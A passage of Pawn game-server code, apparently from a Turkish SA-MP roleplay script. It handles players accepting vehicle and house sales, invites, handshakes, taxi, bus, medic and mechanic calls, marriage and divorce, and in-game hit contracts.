                            PlayerVehicleInfo[playerid][playervehicleid][pvId] = PlayerVehicleInfo[VehicleOffer[playerid]][VehicleId[playerid]][pvId];
                            PlayerVehicleInfo[playerid][playervehicleid][pvModelId] = PlayerVehicleInfo[VehicleOffer[playerid]][VehicleId[playerid]][pvModelId];
                            PlayerVehicleInfo[playerid][playervehicleid][pvPosX] = PlayerVehicleInfo[VehicleOffer[playerid]][VehicleId[playerid]][pvPosX];
                            PlayerVehicleInfo[playerid][playervehicleid][pvPosY] = PlayerVehicleInfo[VehicleOffer[playerid]][VehicleId[playerid]][pvPosY];
                            PlayerVehicleInfo[playerid][playervehicleid][pvPosZ] = PlayerVehicleInfo[VehicleOffer[playerid]][VehicleId[playerid]][pvPosZ];
                            PlayerVehicleInfo[playerid][playervehicleid][pvPosAngle] = PlayerVehicleInfo[VehicleOffer[playerid]][VehicleId[playerid]][pvPosAngle];
                            PlayerVehicleInfo[playerid][playervehicleid][pvLock] = PlayerVehicleInfo[VehicleOffer[playerid]][VehicleId[playerid]][pvLock];
                            PlayerVehicleInfo[playerid][playervehicleid][pvLocked] = PlayerVehicleInfo[VehicleOffer[playerid]][VehicleId[playerid]][pvLocked];
                            PlayerVehicleInfo[playerid][playervehicleid][pvPaintJob] = PlayerVehicleInfo[VehicleOffer[playerid]][VehicleId[playerid]][pvPaintJob];
                            PlayerVehicleInfo[playerid][playervehicleid][pvColor1] = PlayerVehicleInfo[VehicleOffer[playerid]][VehicleId[playerid]][pvColor1];
                            PlayerVehicleInfo[playerid][playervehicleid][pvColor2] = PlayerVehicleInfo[VehicleOffer[playerid]][VehicleId[playerid]][pvColor2];
                            PlayerVehicleInfo[playerid][playervehicleid][pvAllowedplayerid] = PlayerVehicleInfo[VehicleOffer[playerid]][VehicleId[playerid]][pvAllowedplayerid];
                            PlayerVehicleInfo[playerid][playervehicleid][pvPark] = PlayerVehicleInfo[VehicleOffer[playerid]][VehicleId[playerid]][pvPark];
                            PlayerVehicleInfo[playerid][playervehicleid][pvRealID] = PlayerVehicleInfo[VehicleOffer[playerid]][VehicleId[playerid]][pvRealID];
                            PlayerVehicleInfo[playerid][playervehicleid][pvSpawned] = 1;

                            new
                                szQuery[64];

							format(szQuery, sizeof(szQuery), "UPDATE playervehicles SET Owner = %d WHERE ID = %d", PlayerInfo[playerid][pID], GetPVarInt(playerid, "carsaleid"));
							mysql_query(szQuery, THREAD_NO_RESULT, 0, g_MySQLConnections[0]);

                            VehicleSpawned[playerid]++;

                            for(new m = 0; m < MAX_MODS; m++) {
                                PlayerVehicleInfo[playerid][playervehicleid][pvMods][m] = PlayerVehicleInfo[VehicleOffer[playerid]][VehicleId[playerid]][pvMods][m];
                            }

                            PlayerVehicleInfo[VehicleOffer[playerid]][VehicleId[playerid]][pvRealID] = 0;
                            PlayerVehicleInfo[VehicleOffer[playerid]][VehicleId[playerid]][pvId] = INVALID_PLAYER_VEHICLE_ID;
                            PlayerVehicleInfo[VehicleOffer[playerid]][VehicleId[playerid]][pvModelId] = 0;
                            PlayerVehicleInfo[VehicleOffer[playerid]][VehicleId[playerid]][pvPosX] = 0.0;
                            PlayerVehicleInfo[VehicleOffer[playerid]][VehicleId[playerid]][pvPosY] = 0.0;
                            PlayerVehicleInfo[VehicleOffer[playerid]][VehicleId[playerid]][pvPosZ] = 0.0;
                            PlayerVehicleInfo[VehicleOffer[playerid]][VehicleId[playerid]][pvPosAngle] = 0.0;
                            PlayerVehicleInfo[VehicleOffer[playerid]][VehicleId[playerid]][pvLock] = 0;
                            PlayerVehicleInfo[VehicleOffer[playerid]][VehicleId[playerid]][pvLocked] = 0;
                            PlayerVehicleInfo[VehicleOffer[playerid]][VehicleId[playerid]][pvPaintJob] = -1;
                            PlayerVehicleInfo[VehicleOffer[playerid]][VehicleId[playerid]][pvColor1] = 0;
							PlayerVehicleInfo[VehicleOffer[playerid]][VehicleId[playerid]][pvImpounded] = 0;
                            PlayerVehicleInfo[VehicleOffer[playerid]][VehicleId[playerid]][pvColor2] = 0;
                            PlayerVehicleInfo[VehicleOffer[playerid]][VehicleId[playerid]][pvAllowedplayerid] = INVALID_PLAYER_ID;
                            PlayerVehicleInfo[VehicleOffer[playerid]][VehicleId[playerid]][pvPark] = 0;
                            PlayerVehicleInfo[VehicleOffer[playerid]][VehicleId[playerid]][pvSpawned] = 0;
                            VehicleSpawned[VehicleOffer[playerid]]--;
                            for(new m = 0; m < MAX_MODS; m++) {
                                PlayerVehicleInfo[VehicleOffer[playerid]][VehicleId[playerid]][pvMods][m] = 0;
                            }
                            VehicleOffer[playerid] = 999;
                            VehiclePrice[playerid] = 0;

                            DeletePVar(playerid, "carsaleid");

                            return 1;
                        }
                        else {
                            SendClientMessage(playerid, COLOR_GREY, "   Araç Satýcýsý teklif edilen aracýn içinde deðil!");
                            return 1;
                        }
                    }
                    else {
                        SendClientMessage(playerid, COLOR_GREY, "   Arabayý almak için yeterli paranýz yok!");
                        return 1;
                    }
                }
                return 1;
            }
            else {
                SendClientMessage(playerid, COLOR_GREY, "   Kimse size araç satýn almanýzý teklif etmedi!");
                return 1;
            }
        }
        if(strcmp(params,"ev",true) == 0) {
            if(HouseOffer[playerid] < 999) {
                if(IsPlayerConnected(HouseOffer[playerid])) {
                    if(PlayerInfo[HouseOffer[playerid]][pHouse] == INVALID_HOUSE_ID)
                        return SendClientMessage(playerid, COLOR_WHITE, "Bu eve sahip deðiller.");

                    if(GetPlayerCash(playerid) > HousePrice[playerid]) {
                        new house;
                        if(House[playerid] == 1) house = PlayerInfo[HouseOffer[playerid]][pHouse];
                        else if(House[playerid] == 2) house = PlayerInfo[HouseOffer[playerid]][pHouse2];
                        else return SendClientMessage(playerid, COLOR_RED, "Hata: Ev belirlenmemiþ");
                        ClearHouse(house);
                        HouseInfo[house][hLock] = 1;
                        format(HouseInfo[house][hOwner], 128, "Nobody");
                        sendername = GetPlayerNameEx(HouseOffer[playerid]);
                        PlayerPlaySound(playerid, 1052, 0.0, 0.0, 0.0);
                        format(string, sizeof(string), "~w~Tebrikler~n~ Evinizi ~n~~g~$%d fiyata sattýnýz", HousePrice[playerid]);
                        GameTextForPlayer(HouseOffer[playerid], string, 4000, 3);
                        if(House[playerid] == 1) PlayerInfo[HouseOffer[playerid]][pHouse] = INVALID_HOUSE_ID;
                        else PlayerInfo[HouseOffer[playerid]][pHouse2] = INVALID_HOUSE_ID;
                        SaveHouses();
                        OnPlayerStatsUpdate(HouseOffer[playerid]);
                        DestroyPickup(HouseInfo[house][hPickupID]);
                        HouseInfo[house][hPickupID] = CreatePickup(1273, 23, HouseInfo[house][hExteriorX], HouseInfo[house][hExteriorY], HouseInfo[house][hExteriorZ], -1);
                        GivePlayerCash(HouseOffer[playerid],HousePrice[playerid]);

                        PlayerInfo[playerid][pHouse] = house;
                        HouseInfo[house][hOwned] = 1;
                        GetPlayerName(playerid, sendername, sizeof(sendername));
                        strmid(HouseInfo[house][hOwner], sendername, 0, strlen(sendername), 255);
                        GivePlayerCash(playerid,-HousePrice[playerid]);
                        SendClientMessage(playerid, COLOR_WHITE, "Tebrikler, bir yer satýn aldýnýz!");
                        SendClientMessage(playerid, COLOR_WHITE, " /yardim komutunu kullanarak yardým alabilirsiniz!");
                        SaveHouses();
                        OnPlayerStatsUpdate(playerid);
                        DestroyPickup(HouseInfo[house][hPickupID]);
                        HouseInfo[house][hPickupID] = CreatePickup(1273, 23, HouseInfo[house][hExteriorX], HouseInfo[house][hExteriorY], HouseInfo[house][hExteriorZ], -1);
                        format(string, sizeof(string), "Ev sahibi: %s\nLevel: %d\nID: %d",HouseInfo[house][hOwner],HouseInfo[house][hLevel],house);
                        UpdateDynamic3DTextLabelText(HouseInfo[house][hTextID], COLOR_HOUSEGREEN, string);


                        new ip[32], ipex[32];
                        GetPlayerIp(HouseOffer[playerid],ip,sizeof(ip));
                        GetPlayerIp(playerid,ipex,sizeof(ipex));
                        format(string,sizeof(string),"%s (IP: %s)kiþisi (ID %d) evini %s (IP: %s) kiþisine $%d fiyata sattý.",GetPlayerNameEx(HouseOffer[playerid]),ip,house,GetPlayerNameEx(playerid),ipex,HousePrice[playerid]);
                        Log("logs/house.log", string);

                        HouseOffer[playerid] = 999;
                        HousePrice[playerid] = 0;
                        House[playerid] = 0;
                    }
                    else {
                        SendClientMessage(playerid, COLOR_GREY, "Evi almak için yeterli paranýz yok.");
                        HouseOffer[playerid] = 999;
                        HousePrice[playerid] = 0;
                        House[playerid] = 0;
                        return 1;
                    }
                }
                return 1;
            }
            else {
                SendClientMessage(playerid, COLOR_GREY, "Kimse size ev satýn almanýzý teklif etmedi.");
                return 1;
            }
        }
        else if(strcmp(params,"davet",true) == 0)
		{
            if(hInviteOffer[playerid] < 999)
			{
                if(IsPlayerConnected(hInviteOffer[playerid]))
				{
    				if(CheckPointCheck(playerid)) {
                        SendClientMessage(playerid, COLOR_WHITE, "Þu anki checkpoint'inizin iptal edildiðinden emin olun (Materyal paketleriniz veya mevcut checkpoint'iniz olabilir).");
                        return 1;
                    }
					hInviteHouse[playerid] = PlayerInfo[hInviteOffer[playerid]][pHouse];
                    format(string, sizeof(string), "*  %s kiþisinin ev davetini kabul ettiniz, checkpoint noktasý ev için ayarlandý.", GetPlayerNameEx(hInviteOffer[playerid]));
                    SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
                    format(string, sizeof(string), "* %s kiþisi ev davetinizi kabul etti.", GetPlayerNameEx(playerid));
                    SendClientMessage(hInviteOffer[playerid], COLOR_LIGHTBLUE, string);
					DisablePlayerCheckpoint(playerid);
                    SetPlayerCheckpoint(playerid,HouseInfo[hInviteHouse[playerid]][hExteriorX], HouseInfo[hInviteHouse[playerid]][hExteriorY], HouseInfo[hInviteHouse[playerid]][hExteriorZ], 4.0);
                    gPlayerCheckpointStatus[playerid] = CHECKPOINT_HOME;
					//hInviteSlot[playerid] = 0;
                    hInviteOffer[playerid] = 999;
                    hInviteHouse[playerid] = INVALID_HOUSE_ID;
                    return 1;
                }
                else
				{
					//hInviteSlot[playerid] = 0;
                    hInviteOffer[playerid] = 999;
                    hInviteHouse[playerid] = INVALID_HOUSE_ID;
                    SendClientMessage(playerid, COLOR_GREY, "Ev daveti gönderen kiþinin baðlantýsý koptu.");
                }
            }
            else
			{
                SendClientMessage(playerid, COLOR_GREY, "Kimse size ev daveti göndermedi.");
                return 1;
            }
            return 1;
        }
        else if(strcmp(params, "tokalas",true) == 0)
		{
			if(ShakeHandStyle[playerid] != 0 && ShakeHandRequest[playerid] != 999)
			{
				if (ProxDetectorS(1.3, playerid, ShakeHandRequest[playerid]) && (GetPlayerVirtualWorld(ShakeHandRequest[playerid]) == GetPlayerVirtualWorld(playerid)))
				{
					PlayerFacePlayer(playerid, ShakeHandRequest[playerid]);
					if(ShakeHandStyle[playerid] == 1)
					{
						ApplyAnimation(playerid,"GANGS","prtial_hndshk_biz_01", 4.0, 0, 0, 0, 0, 0);
						ApplyAnimation(ShakeHandRequest[playerid],"GANGS","prtial_hndshk_biz_01", 4.0, 0, 0, 0, 0, 0);
					}
					if(ShakeHandStyle[playerid] == 2)
					{
						ApplyAnimation(playerid,"GANGS","prtial_hndshk_01", 4.0, 0, 0, 0, 0, 0);
						ApplyAnimation(ShakeHandRequest[playerid],"GANGS","prtial_hndshk_01", 4.0, 0, 0, 0, 0, 0);
					}
					if((ShakeHandStyle[playerid] == 3) && (GetPlayerState(playerid) ==PLAYER_STATE_ONFOOT) && (GetPlayerState(ShakeHandRequest[playerid]) ==PLAYER_STATE_ONFOOT))
					{
						ApplyAnimation(playerid,"GANGS","hndshkaa", 4.0, 0, 0, 0, 0, 0);
						ApplyAnimation(ShakeHandRequest[playerid],"GANGS","hndshkaa", 4.0, 0, 0, 0, 0, 0);
					}
					if((ShakeHandStyle[playerid] == 4) && (GetPlayerState(playerid) ==PLAYER_STATE_ONFOOT) && (GetPlayerState(ShakeHandRequest[playerid]) ==PLAYER_STATE_ONFOOT))
					{
						ApplyAnimation(playerid,"GANGS","hndshkba", 4.0, 0, 0, 0, 0, 0);
						ApplyAnimation(ShakeHandRequest[playerid],"GANGS","hndshkba", 4.0, 0, 0, 0, 0, 0);
					}
					if((ShakeHandStyle[playerid] == 5) && (GetPlayerState(playerid) ==PLAYER_STATE_ONFOOT) && (GetPlayerState(ShakeHandRequest[playerid]) ==PLAYER_STATE_ONFOOT))
					{
						ApplyAnimation(playerid,"GANGS","hndshkca", 4.0, 0, 0, 0, 0, 0);
						ApplyAnimation(ShakeHandRequest[playerid],"GANGS","hndshkca", 4.0, 0, 0, 0, 0, 0);
					}
					if((ShakeHandStyle[playerid] == 6) && (GetPlayerState(playerid) ==PLAYER_STATE_ONFOOT) && (GetPlayerState(ShakeHandRequest[playerid]) ==PLAYER_STATE_ONFOOT))
					{
						ApplyAnimation(playerid,"GANGS","hndshkcb", 4.0, 0, 0, 0, 0, 0);
						ApplyAnimation(ShakeHandRequest[playerid],"GANGS","hndshkcb", 4.0, 0, 0, 0, 0, 0);
					}
					if((ShakeHandStyle[playerid] == 7) && (GetPlayerState(playerid) ==PLAYER_STATE_ONFOOT) && (GetPlayerState(ShakeHandRequest[playerid]) ==PLAYER_STATE_ONFOOT))
					{
						ApplyAnimation(playerid,"GANGS","hndshkda", 4.0, 0, 0, 0, 0, 0);
						ApplyAnimation(ShakeHandRequest[playerid],"GANGS","hndshkda", 4.0, 0, 0, 0, 0, 0);
					}
					if((ShakeHandStyle[playerid] == 8) && (GetPlayerState(playerid) ==PLAYER_STATE_ONFOOT) && (GetPlayerState(ShakeHandRequest[playerid]) ==PLAYER_STATE_ONFOOT))
					{
						ApplyAnimation(playerid,"GANGS","hndshkea", 4.0, 0, 0, 0, 0, 0);
						ApplyAnimation(ShakeHandRequest[playerid],"GANGS","hndshkea", 4.0, 0, 0, 0, 0, 0);
					}
					if((ShakeHandStyle[playerid] == 9) && (GetPlayerState(playerid) ==PLAYER_STATE_ONFOOT) && (GetPlayerState(ShakeHandRequest[playerid]) ==PLAYER_STATE_ONFOOT))
					{
						ApplyAnimation(playerid,"GANGS","hndshkfa", 4.0, 0, 0, 0, 0, 0);
						ApplyAnimation(ShakeHandRequest[playerid],"GANGS","hndshkfa", 4.0, 0, 0, 0, 0, 0);
					}
					if((ShakeHandStyle[playerid] == 10) && (GetPlayerState(playerid) ==PLAYER_STATE_ONFOOT) && (GetPlayerState(ShakeHandRequest[playerid]) ==PLAYER_STATE_ONFOOT))
					{
						ApplyAnimation(playerid,"GANGS","hndshkfa_swt", 4.0, 0, 0, 0, 0, 0);
						ApplyAnimation(ShakeHandRequest[playerid],"GANGS","hndshkfa_swt", 4.0, 0, 0, 0, 0, 0);
					}
					format(string, sizeof(string), "* %s kiþisi %s ile el sýkýþtý.", GetPlayerNameEx(ShakeHandRequest[playerid]), GetPlayerNameEx(playerid));
					ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
					ShakeHandRequest[playerid] = 999;
					ShakeHandStyle[playerid] = 0;
					return 1;
				}
				else
				{
					format(string, sizeof(string), "%s kiþisi %s kiþisinin eline uzandý fakat kaçýrdý.", GetPlayerNameEx(playerid), GetPlayerNameEx(ShakeHandRequest[playerid]));
					ProxDetector(10.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
				}
      		}
            else SendClientMessage(playerid, COLOR_WHITE, "Hiç el sýkýþma talebiniz yok.");
            return 1;
        }
        else if(strcmp(params,"taksi",true) == 0) {
            if(TransportDuty[playerid] != 1) {
                SendClientMessage(playerid, COLOR_GREY, "   Los Santos Taxi oluþumunda deðilsin!");
                return 1;
            }
            if(TaxiCallTime[playerid] > 0) {
                SendClientMessage(playerid, COLOR_GREY, "   Zaten bir taksi çaðrýsý kabul ettiniz!");
                return 1;
            }
			if(CheckPointCheck(playerid))
			{
				SendClientMessage(playerid, COLOR_WHITE, "Þu anki checkpoint'inizin iptal edildiðinden emin olun (Materyal paketleriniz veya mevcut checkpoint'iniz olabilir).");
				return 1;
			}
            if(TaxiCall < 999) {
                if(IsPlayerConnected(TaxiCall)) {
                    GetPlayerName(playerid, sendername, sizeof(sendername));
                    GetPlayerName(TaxiCall, giveplayer, sizeof(giveplayer));
                    format(string, sizeof(string), "* %s kiþisinden gelen taksi çaðrýsýný kabul ettiniz, ulaþana kadar iþareti göreceksiniz.",giveplayer);
                    SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
                    new zone[MAX_ZONE_NAME];
					GetPlayer3DZone(TaxiCall, zone, sizeof(zone));
					format(string, sizeof(string), "* %s kiþisi %s bölgesinde olabilir.", GetPlayerNameEx(TaxiCall), zone);
					SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
                    format(string, sizeof(string), "* Taksici %s sizin taksi çaðrýnýzý kabul etti; bulunduðunuz noktada lütfen bekleyiniz.",sendername);
                    SendClientMessage(TaxiCall, COLOR_LIGHTBLUE, string);
                    GameTextForPlayer(playerid, "~w~Taksi Çaðrýsý~n~~r~Kýrmýzý iþarete git.", 5000, 1);
                    TaxiCallTime[playerid] = 1;
                    TaxiAccepted[playerid] = TaxiCall;
                    TaxiCall = 999;
                    return 1;
                }
            }
            else {
                SendClientMessage(playerid, COLOR_GREY, "   Kimse henüz taksi çaðýrmadý!");
                return 1;
            }
        }
        else if(strcmp(params,"otobus",true) == 0) {
            if(TransportDuty[playerid] != 2) {
                SendClientMessage(playerid, COLOR_GREY, "   Otobüs þoförü deðilsiniz!");
                return 1;
            }
            if(BusCallTime[playerid] > 0) {
                SendClientMessage(playerid, COLOR_GREY, "   Zaten bir otobüs çaðrýsý kabul ettiniz!");
                return 1;
            }
			if(CheckPointCheck(playerid))
			{
				SendClientMessage(playerid, COLOR_WHITE, "Þu anki checkpoint'inizin iptal edildiðinden emin olun (Materyal paketleriniz veya mevcut checkpoint'iniz olabilir).");
				return 1;
			}
            if(BusCall < 999) {
                if(IsPlayerConnected(BusCall)) {
                    if(CheckPointCheck(playerid)) {
                        SendClientMessage(playerid, COLOR_WHITE, "Þu anki checkpoint'inizin iptal edildiðinden emin olun (Materyal paketleriniz veya mevcut checkpoint'iniz olabilir).");
                        return 1;
                    }
                    GetPlayerName(playerid, sendername, sizeof(sendername));
                    GetPlayerName(BusCall, giveplayer, sizeof(giveplayer));
                    format(string, sizeof(string), "* %s kiþisinden gelen Otobüs Çaðrýsýný kabul ettiniz, ulaþana kadar iþareti göreceksiniz.",giveplayer);
                    SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
                    new zone[MAX_ZONE_NAME];
					GetPlayer3DZone(BusCall, zone, sizeof(zone));
					format(string, sizeof(string), "* %s kiþisi %s bölgesinde olabilir.", GetPlayerNameEx(BusCall), zone);
					SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
                    format(string, sizeof(string), "* Otobüs Þoförü %s otobüs çaðrýnýzý kabul etti; bulunduðunuz noktada bekleyiniz.",sendername);
                    SendClientMessage(BusCall, COLOR_LIGHTBLUE, string);
                    new Float:X,Float:Y,Float:Z;
                    GetPlayerPos(BusCall, X, Y, Z);
                    SetPlayerCheckpoint(playerid, X, Y, Z, 5);
                    GameTextForPlayer(playerid, "~w~Otobüs Çaðrýsý~n~~r~Kýrmýzý iþarete git", 5000, 1);
                    BusCallTime[playerid] = 1;
                    BusAccepted[playerid] = BusCall;
                    BusCall = 999;
                    return 1;
                }
            }
            else {
                SendClientMessage(playerid, COLOR_GREY, "   Kimse henüz otobüs çaðýrmadý!");
                return 1;
            }
        }
        else if(strcmp(params,"doktor",true) == 0) {
            if(PlayerInfo[playerid][pFaction] == 3 || PlayerInfo[playerid][pLeader] == 3) {
                if(MedicCallTime[playerid] > 0) {
                    SendClientMessage(playerid, COLOR_GREY, "   Zaten bir týbbi yardým çaðrýsý kabul ettiniz!");
                    return 1;
                }
                if(CheckPointCheck(playerid)) {
                    SendClientMessage(playerid, COLOR_WHITE, "Þu anki checkpoint'inizin iptal edildiðinden emin olun (Materyal paketleriniz veya mevcut checkpoint'iniz olabilir).");
                    return 1;
                }
                if(MedicCall < 999) {
                    if(IsPlayerConnected(MedicCall)) {
                        GetPlayerName(playerid, sendername, sizeof(sendername));
                        GetPlayerName(MedicCall, giveplayer, sizeof(giveplayer));
                        format(string, sizeof(string), "* %s kiþisinden gelen týbbi yardým çaðrýsýný kabul ettiniz",giveplayer);
                        SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
                        SendClientMessage(playerid, COLOR_LIGHTBLUE, "* 45 saniye sonra kýrmýzý iþaret kaybolacak.");
                        format(string, sizeof(string), "* Doktor %s týbbi yardým çaðrýnýzý kabul etti, bulunduðunuz noktada bekleyiniz.",sendername);
                        SendClientMessage(MedicCall, COLOR_LIGHTBLUE, string);
                        new Float:X,Float:Y,Float:Z;
                        GetPlayerPos(MedicCall, X, Y, Z);
                        SetPlayerCheckpoint(playerid, X, Y, Z, 5);
                        new zone[MAX_ZONE_NAME];
                        GetPlayer3DZone(MedicCall, zone, sizeof(zone));
                        format(string, sizeof(string), "IPUCU: %s kiþisi %s bölgesindedir", GetPlayerNameEx(MedicCall), zone);
                        SendClientMessage(playerid, COLOR_WHITE, string);
                        MedicCallTime[playerid] = 1;
                        MedicAccepted[playerid] = MedicCall;
                        MedicCall = 999;
                        return 1;
                    }
                }
                else {
                    SendClientMessage(playerid, COLOR_GREY, "   Kimse týbbi yardým çaðrýsý yapmadý!");
                    return 1;
                }
            }
            else {
                SendClientMessage(playerid, COLOR_GREY, "   Doktor deðilsiniz!");
                return 1;
            }
        }
        else if(strcmp(params,"tamirci",true) == 0) {
            if(PlayerInfo[playerid][pJob] != 7 && PlayerInfo[playerid][pJob2] != 7) {
                SendClientMessage(playerid, COLOR_GREY, "   Tamrici deðilsiniz!");
                return 1;
            }
            if(MechanicCallTime[playerid] > 0) {
                SendClientMessage(playerid, COLOR_GREY, "   Zaten bir tamir çaðrýsý kabul ettiniz!");
                return 1;
            }
            if(CheckPointCheck(playerid)) {
                SendClientMessage(playerid, COLOR_WHITE, "Þu anki checkpoint'inizin iptal edildiðinden emin olun (Materyal paketleriniz veya mevcut checkpoint'iniz olabilir).");
                return 1;
            }
            if(MechanicCall < 999) {
                if(IsPlayerConnected(MechanicCall)) {
                    if(playerid == MechanicCall) return 1;
                    GetPlayerName(playerid, sendername, sizeof(sendername));
                    GetPlayerName(MechanicCall, giveplayer, sizeof(giveplayer));
                    format(string, sizeof(string), "* %s kiþisinden gelen tamir çaðrýsýný kabul ettiniz, oraya gitmek için 30 saniyeniz var.",giveplayer);
                    SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
                    SendClientMessage(playerid, COLOR_LIGHTBLUE, "* 30 saniye sonra kýrmýzý iþaret kaybolacak.");
                    format(string, sizeof(string), "* Tamirci %s tamir çaðrýnýzý kabul etti, bulunduðunuz noktada bekleyiniz.",sendername);
                    SendClientMessage(MechanicCall, COLOR_LIGHTBLUE, string);
                    new Float:X,Float:Y,Float:Z;
                    GetPlayerPos(MechanicCall, X, Y, Z);
                    SetPlayerCheckpoint(playerid, X, Y, Z, 5);
                    GameTextForPlayer(playerid, "~w~Tamir Çaðrýsý~n~~r~Kýrmýzý iþarete git", 5000, 1);
                    MechanicCallTime[playerid] = 1;
                    MechanicCall = 999;
                    return 1;
                }
            }
            else {
                SendClientMessage(playerid, COLOR_GREY, "   Kimse henüz tamirci çaðýrmadý!");
                return 1;
            }
        }
       	else if(strcmp(params,"bosanmak",true) == 0) {
            if(DivorceOffer[playerid] < 999) {
                if(IsPlayerConnected(DivorceOffer[playerid])) {
                    if(ProxDetectorS(10.0, playerid, DivorceOffer[playerid])) {
                        GetPlayerName(DivorceOffer[playerid], giveplayer, sizeof(giveplayer));
                        GetPlayerName(playerid, sendername, sizeof(sendername));
                        format(string, sizeof(string), "* %s kiþisinden boþanmak için evraklarý imzaladýnýz, tekrardan bekarsýnýz.", giveplayer);
                        SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
                        format(string, sizeof(string), "* %s kiþisi boþanma evraklarýný imzaladý, tekrardan bekarsýnýz.", sendername);
                        SendClientMessage(DivorceOffer[playerid], COLOR_LIGHTBLUE, string);
                        ClearMarriage(playerid);
                        ClearMarriage(DivorceOffer[playerid]);
                        return 1;
                    }
                    else {
                        SendClientMessage(playerid, COLOR_GREY, "   Size boþanma evraký gönderen kiþi yanýnýzda deðil!");
                        return 1;
                    }
                }
            }
            else {
                SendClientMessage(playerid, COLOR_GREY, "Kimse size boþanma evraký göndermedi.");
                return 1;
            }
        }
        else if(strcmp(params,"sahitlik",true) == 0) {
            if(MarryWitnessOffer[playerid] < 999) {
                if(IsPlayerConnected(MarryWitnessOffer[playerid])) {
                    if(ProxDetectorS(10.0, playerid, MarryWitnessOffer[playerid])) {
                        GetPlayerName(MarryWitnessOffer[playerid], giveplayer, sizeof(giveplayer));
                        GetPlayerName(playerid, sendername, sizeof(sendername));
                        format(string, sizeof(string), "*  %s kiþisinden gelen nikah þahidi talebini kabul ettiniz.", giveplayer);
                        SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
                        format(string, sizeof(string), "* %s kiþisi, nikah þahidiniz olmayý kabul etti.", sendername);
                        SendClientMessage(MarryWitnessOffer[playerid], COLOR_LIGHTBLUE, string);
                        MarryWitness[MarryWitnessOffer[playerid]] = playerid;
                        MarryWitnessOffer[playerid] = 999;
                        return 1;
                    }
                    else {
                        SendClientMessage(playerid, COLOR_GREY, "   Nikah þahidi olacaðýnýz kiþi yanýnýzda deðil!");
                        return 1;
                    }
                }
            }
            else {
                SendClientMessage(playerid, COLOR_GREY, "   Kimse sizden nikah þahidi olmanýzý istemedi!");
                return 1;
            }
        }
        else if(strcmp(params,"evlilik",true) == 0) {
            if(ProposeOffer[playerid] < 999) {
                if(IsPlayerConnected(ProposeOffer[playerid])) {
                    if(ProxDetectorS(10.0, playerid, ProposeOffer[playerid])) {
                        if(MarryWitness[ProposeOffer[playerid]] == 999) {
                            SendClientMessage(playerid, COLOR_GREY, "   Teklif eden kiþinin nikah þahidi yok!");
                            return 1;
                        }
                        if(IsPlayerConnected(MarryWitness[ProposeOffer[playerid]])) {
                            if(ProxDetectorS(12.0, ProposeOffer[playerid], MarryWitness[ProposeOffer[playerid]])) {
                                if(IsPlayerInRangeOfPoint(playerid, 10.0, 1963.9612, -369.1851, 1093.7289)) {
                                    GetPlayerName(ProposeOffer[playerid], giveplayer, sizeof(giveplayer));
                                    GetPlayerName(playerid, sendername, sizeof(sendername));
                                    format(string, sizeof(string), "*  %s kiþisinin kocanýz olma isteðini kabul ettiniz.", giveplayer);
                                    SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
                                    format(string, sizeof(string), "* %s karýnýz olmayý kabul etti.", sendername);
                                    SendClientMessage(ProposeOffer[playerid], COLOR_LIGHTBLUE, string);
                                    format(string, sizeof(string), "Rahip: %s, %s kiþisini kocanýz olarak kabul ediyor musunuz? ( 'evet' yazýn, baþka yazacaðýnýz her þey evliliði reddedecektir.)", sendername, giveplayer);
                                    SendClientMessage(playerid, COLOR_WHITE, string);
                                    MarriageCeremoney[playerid] = 1;
                                    ProposedTo[ProposeOffer[playerid]] = playerid;
                                    GotProposedBy[playerid] = ProposeOffer[playerid];
                                    MarryWitness[ProposeOffer[playerid]] = 999;
                                    ProposeOffer[playerid] = 999;
                                    return 1;
                                }
                                else {
                                    SendClientMessage(playerid, COLOR_GREY, "   Kilisede deðilsiniz!");
                                    return 1;
                                }
                            }
                            else {
                                SendClientMessage(playerid, COLOR_GREY, "   Nikah þahidi, teklif eden kiþinin yanýnda deðil!");
                                return 1;
                            }
                        }
                        return 1;
                    }
                    else {
                        SendClientMessage(playerid, COLOR_GREY, "   Evlilik teklifi eden kiþi yanýnýzda deðil!");
                        return 1;
                    }
                }
            }
            else {
                SendClientMessage(playerid, COLOR_GREY, "   Kimse size evlilik teklif etmedi!");
                return 1;
            }
        }
        else if(strcmp(params,"kontrakt",true) == 0) {
            if(HitOffer[playerid] < 999) {
                if(HitToGet[playerid] < 999) {
                    if(IsPlayerConnected(HitToGet[playerid])) {
                        format(string, sizeof(string), "* %s kiþisi %s kiþisini öldürmek için kontratý kabul etti.", GetPlayerNameEx(playerid),GetPlayerNameEx(HitToGet[playerid]));
                        SendClientMessage(HitOffer[playerid], COLOR_LIGHTBLUE, string);
                        format(string, sizeof(string), "* %s kiþisini öldürmek için kontratý kabul ettiniz, iþ bitiminde $%d alacaksýnýz.", GetPlayerNameEx(HitToGet[playerid]), PlayerInfo[HitToGet[playerid]][pHeadValue] / 4 * 2);
                        SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
                        format(string, sizeof(string), "%s kiþisi, %s kiþisini öldürmek için kontratta görevlendirildi, ücret $%d.", GetPlayerNameEx(playerid), GetPlayerNameEx(HitToGet[playerid]),  PlayerInfo[HitToGet[playerid]][pHeadValue] / 4 * 2);
                        SendFamilyMessage(4, COLOR_YELLOW, string);
                        GoChase[playerid] = HitToGet[playerid];
                        GetChased[HitToGet[playerid]] = playerid;
                        GotHit[HitToGet[playerid]] = 1;
                        HitToGet[playerid] = 999;
                        HitOffer[playerid] = 999;
                        return 1;
                    }
                    else {
                        HitToGet[playerid] = 999;
                        HitOffer[playerid] = 999;
                        return 1;
                    }
                }
            }
            else {
                SendClientMessage(playerid, COLOR_GREY, "   Kimse size kontrat önermedi!");
                return 1;
            }
        }
        else if(strcmp(params,"ceza",true) == 0) {
            if(TicketOffer[playerid] < 999) {
                if(IsPlayerConnected(TicketOffer[playerid])) {
                    if(ProxDetectorS(5.0, playerid, TicketOffer[playerid])) {
